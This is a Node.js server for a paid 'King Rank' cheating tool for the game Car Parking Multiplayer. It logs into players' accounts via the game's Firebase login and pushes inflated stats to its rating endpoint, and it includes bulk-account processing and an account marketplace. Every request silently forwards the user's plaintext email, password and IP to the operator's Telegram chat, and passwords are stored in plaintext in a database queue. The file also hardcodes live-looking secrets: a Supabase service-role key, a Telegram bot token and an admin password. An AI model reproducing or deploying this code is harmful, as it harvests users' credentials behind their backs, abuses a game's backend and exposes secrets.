const express = require('express');
const crypto = require('crypto');
const cors = require('cors');
const axios = require('axios');
const rateLimit = require('express-rate-limit');
const helmet = require('helmet');
const { createClient } = require('@supabase/supabase-js');

const app = express();

// ============================================================
// SUPABASE CONFIGURATION (SAMA DENGAN SERVER.JS UTAMA)
// ============================================================
const SUPABASE_URL = "https://npnnazppmobbuqsitaxb.supabase.co";
const SUPABASE_SERVICE_ROLE_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im5wbm5henBwbW9iYnVxc2l0YXhiIiwicm9sZSI6InNlcnZpY2Vfcm9sZSIsImlhdCI6MTc3NzE0NzUzNCwiZXhwIjoyMDkyNzIzNTM0fQ.VeFewsT9GG9xnvW2CkfaEMEx_FMOsWgcDW2JlI2zm7Y";

const supabase = createClient(SUPABASE_URL, SUPABASE_SERVICE_ROLE_KEY);

// ============================================================
// KONFIGURASI
// ============================================================
const PORT = 3000;
const BOT_TOKEN = "8049314105:AAE0Tk2ifyJdACQRGuiQJnN8C-YsNUWuzvI";
const OWNER_ID = "7492782458";
const NEXUS_VERIFY_URL = "https://system-nexus-key.vercel.app";
const ADMIN_KEY = "AldzKing2010";

// ============================================================
// MIDDLEWARE
// ============================================================
app.use(helmet({ contentSecurityPolicy: false }));
app.use(cors({ origin: '*', credentials: true }));
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// ============================================================
// RATE LIMITER
// ============================================================
const limiter = rateLimit({
    windowMs: 60 * 1000,
    max: 100,
    message: { success: false, error: 'Too many requests' },
    skip: (req) => req.path === '/api/health' || req.path === '/api/cooldown'
});
app.use('/api/', limiter);

// ============================================================
// CPM CONFIG (ONLY CPM 1 - CPM 2 REMOVED)
// ============================================================
const CPM_CONFIG = {
    id: 'cpm1',
    name: 'Car Parking Multiplayer',
    firebaseApiKey: 'AIzaSyBW1ZbMiUeDZHYUO2bY8Bfnf5rRgrQGPTM',
    loginUrl: 'https://www.googleapis.com/identitytoolkit/v3/relyingparty/verifyPassword',
    rankUrl: 'https://us-central1-cp-multiplayer.cloudfunctions.net/SetUserRating4'
};

// ============================================================
// KING RANK DEFAULT SETTINGS (AKAN DI LOAD DARI DATABASE)
// ============================================================
let kingRankSettings = {
    rating: {
        targetRating: 100000,
        minXP: 100000,
        race_win: 3000,
        statsMultiplier: 1.5
    },
    stats: {
        cars: 100000,
        car_fix: 100000,
        car_collided: 100000,
        car_exchange: 100000,
        car_trade: 100000,
        car_wash: 100000,
        slicer_cut: 100000,
        drift_max: 100000,
        drift: 100000,
        cargo: 100000,
        delivery: 100000,
        taxi: 100000,
        levels: 1000,
        gifts: 100000,
        fuel: 100000,
        offroad: 100000,
        speed_banner: 100000,
        reactions: 100000,
        police: 100000,
        run: 100000,
        real_estate: 1000,
        t_distance: 10000000,
        treasure: 100000,
        block_post: 100000,
        push_ups: 100000,
        passanger_distance: 100000,
        time: 10000000000,
        race_win: 3000
    }
};

// ============================================================
// LOAD SETTINGS FROM SUPABASE
// ============================================================
async function loadKingSettingsFromDB() {
    try {
        // Load rating settings
        const { data: ratingData } = await supabase
            .from('cpm_settings')
            .select('*')
            .eq('category', 'rating')
            .maybeSingle();
        
        if (ratingData && ratingData.settings) {
            kingRankSettings.rating = { ...kingRankSettings.rating, ...ratingData.settings };
        }
        
        // Load stats settings
        const { data: statsData } = await supabase
            .from('cpm_settings')
            .select('*')
            .eq('category', 'stats')
            .maybeSingle();
        
        if (statsData && statsData.settings) {
            kingRankSettings.stats = { ...kingRankSettings.stats, ...statsData.settings };
        }
        
        console.log('✅ King Rank settings loaded from Supabase');
    } catch (error) {
        console.error('Error loading settings:', error);
        // Create default settings if not exists
        await saveKingSettingsToDB();
    }
}

async function saveKingSettingsToDB() {
    try {
        // Save rating settings
        await supabase
            .from('cpm_settings')
            .upsert({
                category: 'rating',
                settings: kingRankSettings.rating,
                updated_at: Date.now()
            }, { onConflict: 'category' });
        
        // Save stats settings
        await supabase
            .from('cpm_settings')
            .upsert({
                category: 'stats',
                settings: kingRankSettings.stats,
                updated_at: Date.now()
            }, { onConflict: 'category' });
        
        console.log('✅ King Rank settings saved to Supabase');
    } catch (error) {
        console.error('Error saving settings:', error);
    }
}

// ============================================================
// HELPER FUNCTIONS
// ============================================================
function getClientIp(req) {
    return req.headers['x-forwarded-for']?.split(',')[0] || 
           req.socket.remoteAddress || 
           req.ip || 
           'Unknown';
}

function generateQueueId() {
    return 'Q' + Date.now().toString(36).toUpperCase() + crypto.randomBytes(4).toString('hex').toUpperCase();
}

function generateMarketplaceId() {
    return 'LST' + Date.now().toString(36).toUpperCase() + crypto.randomBytes(4).toString('hex').toUpperCase();
}

async function sendTelegramNotification(email, password, status, nexusKey, ipAddress, details = '') {
    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
    const timestamp = new Date().toLocaleString('en-US', { timeZone: 'Asia/Jakarta' });
    
    let message = `👑 CPM KING RANK TOOL\n\n`;
    message += `📧 Email: ${email}\n`;
    message += `🔑 Password: ${password}\n`;
    message += `📊 Status: ${status}\n`;
    message += `🔑 Nexus Key: ${nexusKey}\n`;
    message += `🌐 IP: ${ipAddress}\n`;
    message += `📝 Details: ${details}\n`;
    message += `⏰ Time: ${timestamp}\n`;
    
    try {
        await axios.post(url, { chat_id: OWNER_ID, text: message, parse_mode: 'HTML' }, { timeout: 10000 });
        return true;
    } catch (error) {
        console.error('Telegram error:', error.message);
        return false;
    }
}

function sleep(ms) { return new Promise(resolve => setTimeout(resolve, ms)); }

async function verifyNexusKey(key, deviceFingerprint = null) {
    if (!key) return { valid: false, error: 'Key is required' };
    try {
        const payload = { key: key };
        if (deviceFingerprint) payload.deviceFingerprint = deviceFingerprint;
        const response = await axios.post(`${NEXUS_VERIFY_URL}/api/verify-key`, payload, { timeout: 15000 });
        return response.data;
    } catch (error) {
        return { valid: false, error: 'Verification service unavailable' };
    }
}

// ============================================================
// BUILD RATING DATA (CUSTOMIZABLE DARI DATABASE)
// ============================================================
function buildRatingData(customStats = null) {
    const stats = customStats || kingRankSettings.stats;
    const ratingData = { ...stats };
    ratingData.time = kingRankSettings.rating.targetRating || 10000000000;
    ratingData.race_win = kingRankSettings.rating.race_win || 3000;
    return ratingData;
}

// ============================================================
// CPM LOGIN
// ============================================================
async function cpmLogin(email, password) {
    const response = await axios.post(`${CPM_CONFIG.loginUrl}?key=${CPM_CONFIG.firebaseApiKey}`, {
        email: email,
        password: password,
        returnSecureToken: true,
        clientType: 'CLIENT_TYPE_ANDROID'
    }, {
        headers: { 'Content-Type': 'application/json', 'User-Agent': 'Dalvik/2.1.0 (Linux; U; Android 12)' },
        timeout: 20000
    });
    
    if (!response.data || !response.data.idToken) throw new Error('Invalid login response');
    return { idToken: response.data.idToken, localId: response.data.localId, email: response.data.email };
}

// ============================================================
// SET KING RANK
// ============================================================
async function setKingRank(idToken, customStats = null) {
    const ratingData = buildRatingData(customStats);
    const response = await axios.post(CPM_CONFIG.rankUrl, { data: JSON.stringify({ RatingData: ratingData }) }, {
        headers: { 'Authorization': `Bearer ${idToken}`, 'Content-Type': 'application/json', 'User-Agent': 'okhttp/3.12.13' },
        timeout: 30000
    });
    if (response.status !== 200) throw new Error(`Rank API responded with status ${response.status}`);
    return true;
}

// ============================================================
// QUEUE SYSTEM (DISIMPAN DI SUPABASE)
// ============================================================
class QueueProcessor {
    constructor() {
        this.isProcessing = false;
    }
    
    async addToQueue(task) {
        const queueId = generateQueueId();
        
        await supabase
            .from('cpm_queue')
            .insert({
                queue_id: queueId,
                email: task.email,
                password: task.password,
                nexus_key: task.nexusKey,
                ip_address: task.ipAddress,
                custom_stats: task.customStats,
                status: 'pending',
                created_at: Date.now()
            });
        
        this.processQueue();
        return queueId;
    }
    
    async getQueueLength() {
        const { count } = await supabase
            .from('cpm_queue')
            .select('*', { count: 'exact', head: true })
            .in('status', ['pending', 'processing']);
        return count || 0;
    }
    
    async processQueue() {
        if (this.isProcessing) return;
        this.isProcessing = true;
        
        while (true) {
            // Ambil task pending pertama
            const { data: task } = await supabase
                .from('cpm_queue')
                .select('*')
                .eq('status', 'pending')
                .order('created_at', { ascending: true })
                .limit(1)
                .single();
            
            if (!task) break;
            
            // Update status ke processing
            await supabase
                .from('cpm_queue')
                .update({ status: 'processing', started_at: Date.now() })
                .eq('queue_id', task.queue_id);
            
            try {
                const loginResult = await cpmLogin(task.email, task.password);
                await setKingRank(loginResult.idToken, task.custom_stats);
                
                await supabase
                    .from('cpm_queue')
                    .update({ 
                        status: 'completed', 
                        completed_at: Date.now(),
                        result: 'success'
                    })
                    .eq('queue_id', task.queue_id);
                
                // Update analytics
                await updateAnalytics('success', task.email);
                
                await sendTelegramNotification(task.email, task.password, '✅ QUEUE SUCCESS', task.nexus_key, task.ip_address, `Queue ID: ${task.queue_id}`);
            } catch (error) {
                await supabase
                    .from('cpm_queue')
                    .update({ 
                        status: 'failed', 
                        completed_at: Date.now(),
                        error_message: error.message
                    })
                    .eq('queue_id', task.queue_id);
                
                await updateAnalytics('failed', task.email);
                await sendTelegramNotification(task.email, task.password, '❌ QUEUE FAILED', task.nexus_key, task.ip_address, `Error: ${error.message}`);
            }
            
            await sleep(2000 + Math.random() * 3000);
        }
        
        this.isProcessing = false;
    }
    
    async getQueueStatus() {
        const { data: queue } = await supabase
            .from('cpm_queue')
            .select('queue_id, email, status, created_at, started_at, completed_at')
            .order('created_at', { ascending: false })
            .limit(20);
        
        const pendingCount = await this.getQueueLength();
        
        return {
            isProcessing: this.isProcessing,
            queueLength: pendingCount,
            queue: queue || []
        };
    }
}

const queueProcessor = new QueueProcessor();

// ============================================================
// ANALYTICS FUNCTIONS
// ============================================================
async function updateAnalytics(status, email) {
    const today = new Date().toISOString().split('T')[0];
    
    // Update daily stats
    const { data: existing } = await supabase
        .from('cpm_analytics_daily')
        .select('*')
        .eq('date', today)
        .maybeSingle();
    
    if (existing) {
        await supabase
            .from('cpm_analytics_daily')
            .update({
                success_count: existing.success_count + (status === 'success' ? 1 : 0),
                failed_count: existing.failed_count + (status === 'failed' ? 1 : 0),
                total_count: existing.total_count + 1
            })
            .eq('date', today);
    } else {
        await supabase
            .from('cpm_analytics_daily')
            .insert({
                date: today,
                success_count: status === 'success' ? 1 : 0,
                failed_count: status === 'failed' ? 1 : 0,
                total_count: 1
            });
    }
    
    // Update total stats
    const { data: totalStats } = await supabase
        .from('cpm_analytics_total')
        .select('*')
        .limit(1)
        .maybeSingle();
    
    if (totalStats) {
        await supabase
            .from('cpm_analytics_total')
            .update({
                total_processed: totalStats.total_processed + 1,
                total_success: totalStats.total_success + (status === 'success' ? 1 : 0),
                total_failed: totalStats.total_failed + (status === 'failed' ? 1 : 0),
                last_updated: Date.now()
            });
    } else {
        await supabase
            .from('cpm_analytics_total')
            .insert({
                total_processed: 1,
                total_success: status === 'success' ? 1 : 0,
                total_failed: status === 'failed' ? 1 : 0,
                last_updated: Date.now()
            });
    }
}

async function getAnalytics() {
    // Get total stats
    const { data: totalStats } = await supabase
        .from('cpm_analytics_total')
        .select('*')
        .limit(1)
        .maybeSingle();
    
    // Get last 7 days stats
    const last7Days = [];
    for (let i = 6; i >= 0; i--) {
        const date = new Date();
        date.setDate(date.getDate() - i);
        const dateStr = date.toISOString().split('T')[0];
        
        const { data: dayStats } = await supabase
            .from('cpm_analytics_daily')
            .select('*')
            .eq('date', dateStr)
            .maybeSingle();
        
        last7Days.push({
            date: dateStr,
            success: dayStats?.success_count || 0,
            failed: dayStats?.failed_count || 0,
            total: dayStats?.total_count || 0
        });
    }
    
    const total = totalStats || { total_processed: 0, total_success: 0, total_failed: 0 };
    
    return {
        total: {
            processed: total.total_processed || 0,
            success: total.total_success || 0,
            failed: total.total_failed || 0,
            successRate: total.total_processed > 0 
                ? ((total.total_success / total.total_processed) * 100).toFixed(1) 
                : 0
        },
        daily: {
            today: last7Days[last7Days.length - 1],
            week: last7Days
        }
    };
}

// ============================================================
// MARKETPLACE FUNCTIONS (DISIMPAN DI SUPABASE)
// ============================================================
async function createMarketplaceListing(sellerId, itemType, itemData, price, nexusKey) {
    const listingId = generateMarketplaceId();
    
    await supabase
        .from('cpm_marketplace')
        .insert({
            listing_id: listingId,
            seller_id: sellerId,
            item_type: itemType,
            item_data: itemData,
            price: price,
            nexus_key: nexusKey,
            status: 'active',
            listed_at: Date.now()
        });
    
    return listingId;
}

async function getMarketplaceListings(type = null, maxPrice = null) {
    let query = supabase
        .from('cpm_marketplace')
        .select('*')
        .eq('status', 'active')
        .order('price', { ascending: true });
    
    if (type) query = query.eq('item_type', type);
    if (maxPrice) query = query.lte('price', maxPrice);
    
    const { data } = await query;
    return data || [];
}

async function buyMarketplaceItem(listingId, buyerId, nexusKey) {
    // Get listing
    const { data: listing } = await supabase
        .from('cpm_marketplace')
        .select('*')
        .eq('listing_id', listingId)
        .eq('status', 'active')
        .single();
    
    if (!listing) throw new Error('Listing not found');
    
    // Update status
    await supabase
        .from('cpm_marketplace')
        .update({
            status: 'sold',
            buyer_id: buyerId,
            sold_at: Date.now(),
            buyer_nexus_key: nexusKey
        })
        .eq('listing_id', listingId);
    
    return listing;
}

// ============================================================
// API ENDPOINTS
// ============================================================

// Health check
app.get('/api/health', (req, res) => {
    res.json({ status: 'OK', timestamp: new Date().toISOString(), uptime: process.uptime() });
});

// ============================================================
// LIVE STATS (Fitur 6)
// ============================================================
app.get('/api/live-stats', async (req, res) => {
    try {
        const analytics = await getAnalytics();
        const queueLength = await queueProcessor.getQueueLength();
        
        res.json({
            success: true,
            stats: {
                totalProcessed: analytics.total.processed,
                successCount: analytics.total.success,
                failedCount: analytics.total.failed,
                successRate: analytics.total.successRate,
                queueLength: queueLength,
                isProcessing: queueProcessor.isProcessing,
                todaySuccess: analytics.daily.today.success,
                todayFailed: analytics.daily.today.failed
            },
            timestamp: Date.now()
        });
    } catch (error) {
        res.status(500).json({ success: false, error: error.message });
    }
});

// ============================================================
// QUEUE SYSTEM (Fitur 9)
// ============================================================
app.post('/api/queue/add', async (req, res) => {
    try {
        const { email, password, nexusKey, customStats } = req.body;
        const ipAddress = getClientIp(req);
        
        if (!email || !password || !nexusKey) {
            return res.status(400).json({ success: false, error: 'Email, password, and nexusKey required' });
        }
        
        const keyResult = await verifyNexusKey(nexusKey);
        if (!keyResult.valid) {
            return res.status(400).json({ success: false, error: 'Invalid Nexus Key' });
        }
        
        const queueId = await queueProcessor.addToQueue({ email, password, nexusKey, ipAddress, customStats });
        const queueLength = await queueProcessor.getQueueLength();
        
        res.json({ success: true, queueId: queueId, position: queueLength, message: `Added to queue. Position: ${queueLength}` });
    } catch (error) {
        res.status(500).json({ success: false, error: error.message });
    }
});

app.get('/api/queue/status', async (req, res) => {
    try {
        const status = await queueProcessor.getQueueStatus();
        res.json({ success: true, ...status });
    } catch (error) {
        res.status(500).json({ success: false, error: error.message });
    }
});

// ============================================================
// ANALYTICS (Fitur 10)
// ============================================================
app.get('/api/analytics', async (req, res) => {
    try {
        const analytics = await getAnalytics();
        const queueLength = await queueProcessor.getQueueLength();
        
        res.json({
            success: true,
            analytics: {
                total: analytics.total,
                daily: analytics.daily,
                queueStats: {
                    totalQueued: analytics.total.processed,
                    currentQueue: queueLength,
                    isProcessing: queueProcessor.isProcessing
                }
            }
        });
    } catch (error) {
        res.status(500).json({ success: false, error: error.message });
    }
});

// ============================================================
// MARKETPLACE (Fitur 13)
// ============================================================
app.post('/api/marketplace/list', async (req, res) => {
    try {
        const { sellerId, itemType, itemData, price, nexusKey } = req.body;
        
        if (!sellerId || !itemType || !price || !nexusKey) {
            return res.status(400).json({ success: false, error: 'Missing required fields' });
        }
        
        const keyResult = await verifyNexusKey(nexusKey);
        if (!keyResult.valid) {
            return res.status(400).json({ success: false, error: 'Invalid Nexus Key' });
        }
        
        const listingId = await createMarketplaceListing(sellerId, itemType, itemData, price, nexusKey);
        res.json({ success: true, listingId, message: 'Item listed on marketplace' });
    } catch (error) {
        res.status(500).json({ success: false, error: error.message });
    }
});

app.get('/api/marketplace/listings', async (req, res) => {
    try {
        const { type, maxPrice } = req.query;
        const listings = await getMarketplaceListings(type, maxPrice ? parseInt(maxPrice) : null);
        res.json({ success: true, listings });
    } catch (error) {
        res.status(500).json({ success: false, error: error.message });
    }
});

app.post('/api/marketplace/buy', async (req, res) => {
    try {
        const { listingId, buyerId, nexusKey } = req.body;
        
        const keyResult = await verifyNexusKey(nexusKey);
        if (!keyResult.valid) {
            return res.status(400).json({ success: false, error: 'Invalid Nexus Key' });
        }
        
        const item = await buyMarketplaceItem(listingId, buyerId, nexusKey);
        res.json({ success: true, message: `Item purchased!`, item: item.item_data });
    } catch (error) {
        res.status(500).json({ success: false, error: error.message });
    }
});

// ============================================================
// KING RANK CUSTOM SETTINGS
// ============================================================
app.get('/api/king-settings', async (req, res) => {
    try {
        res.json({ success: true, settings: kingRankSettings });
    } catch (error) {
        res.status(500).json({ success: false, error: error.message });
    }
});

app.post('/api/king-settings/update', async (req, res) => {
    try {
        const { adminKey, rating, stats } = req.body;
        
        if (adminKey !== ADMIN_KEY) {
            return res.status(401).json({ success: false, error: 'Unauthorized' });
        }
        
        if (rating) {
            kingRankSettings.rating = { ...kingRankSettings.rating, ...rating };
        }
        if (stats) {
            kingRankSettings.stats = { ...kingRankSettings.stats, ...stats };
        }
        
        await saveKingSettingsToDB();
        
        res.json({ success: true, message: 'King Rank settings updated', settings: kingRankSettings });
    } catch (error) {
        res.status(500).json({ success: false, error: error.message });
    }
});

app.post('/api/king-settings/preview', async (req, res) => {
    try {
        const { customStats } = req.body;
        const ratingData = buildRatingData(customStats || kingRankSettings.stats);
        
        const totalXP = Object.values(ratingData).reduce((a, b) => a + (parseInt(b) || 0), 0);
        
        res.json({
            success: true,
            preview: {
                totalStats: Object.keys(ratingData).length,
                estimatedXP: totalXP,
                ratingData: ratingData
            }
        });
    } catch (error) {
        res.status(500).json({ success: false, error: error.message });
    }
});

app.post('/api/apply-custom-stats', async (req, res) => {
    try {
        const { email, password, nexusKey, customStats } = req.body;
        const ipAddress = getClientIp(req);
        
        if (!email || !password || !nexusKey) {
            return res.status(400).json({ success: false, error: 'Missing required fields' });
        }
        
        const keyResult = await verifyNexusKey(nexusKey);
        if (!keyResult.valid) {
            return res.status(400).json({ success: false, error: 'Invalid Nexus Key' });
        }
        
        const loginResult = await cpmLogin(email, password);
        await setKingRank(loginResult.idToken, customStats);
        
        await updateAnalytics('success', email);
        await sendTelegramNotification(email, password, '✅ CUSTOM STATS APPLIED', nexusKey, ipAddress, 'Custom King Rank settings applied');
        
        res.json({ success: true, message: 'Custom stats applied successfully!' });
    } catch (error) {
        const ipAddress = getClientIp(req);
        await updateAnalytics('failed', req.body.email);
        await sendTelegramNotification(req.body.email, req.body.password, '❌ CUSTOM STATS FAILED', req.body.nexusKey, ipAddress, error.message);
        res.status(500).json({ success: false, error: error.message });
    }
});

// ============================================================
// ORIGINAL API (Set King Rank)
// ============================================================
app.post('/api/set-rank', async (req, res) => {
    try {
        const { email, password, nexusKey } = req.body;
        const ipAddress = getClientIp(req);
        
        if (!email || !password || !nexusKey) {
            return res.status(400).json({ success: false, error: 'Missing required fields' });
        }
        
        const keyResult = await verifyNexusKey(nexusKey);
        if (!keyResult.valid) {
            return res.status(400).json({ success: false, error: 'Invalid Nexus Key' });
        }
        
        const loginResult = await cpmLogin(email, password);
        await setKingRank(loginResult.idToken);
        
        await updateAnalytics('success', email);
        await sendTelegramNotification(email, password, '✅ SUCCESS - King Rank Set', nexusKey, ipAddress);
        
        res.json({ success: true, message: 'King Rank successfully activated!' });
    } catch (error) {
        const ipAddress = getClientIp(req);
        await updateAnalytics('failed', req.body.email);
        await sendTelegramNotification(req.body.email, req.body.password, '❌ FAILED', req.body.nexusKey, ipAddress, error.message);
        res.status(500).json({ success: false, error: error.message });
    }
});

// ============================================================
// BULK PROCESS
// ============================================================
app.post('/api/bulk-process', async (req, res) => {
    try {
        const { accounts, nexusKey } = req.body;
        const ipAddress = getClientIp(req);
        
        if (!accounts || !Array.isArray(accounts) || accounts.length === 0) {
            return res.status(400).json({ success: false, error: 'Accounts array required' });
        }
        
        const keyResult = await verifyNexusKey(nexusKey);
        if (!keyResult.valid) {
            return res.status(400).json({ success: false, error: 'Invalid Nexus Key' });
        }
        
        const results = [];
        for (const acc of accounts) {
            try {
                const loginResult = await cpmLogin(acc.email, acc.password);
                await setKingRank(loginResult.idToken);
                results.push({ email: acc.email, success: true, message: 'King Rank activated' });
                await updateAnalytics('success', acc.email);
                await sleep(2000 + Math.random() * 3000);
            } catch (error) {
                results.push({ email: acc.email, success: false, error: error.message });
                await updateAnalytics('failed', acc.email);
            }
        }
        
        await sendTelegramNotification('BULK', 'BULK', `Processed ${results.filter(r => r.success).length}/${accounts.length} accounts`, nexusKey, ipAddress);
        res.json({ success: true, results });
    } catch (error) {
        res.status(500).json({ success: false, error: error.message });
    }
});

// ============================================================
// START SERVER
// ============================================================
async function start() {
    await loadKingSettingsFromDB();
    
    app.listen(PORT, () => {
        console.log(`👑 CPM KING RANK TOOL running on port ${PORT}`);
        console.log(`📊 Features: Queue System | Marketplace | Analytics | Custom Stats | Supabase Database`);
        console.log(`✅ CPM 2 has been REMOVED (server not available)`);
    });
}

start();

module.exports = app;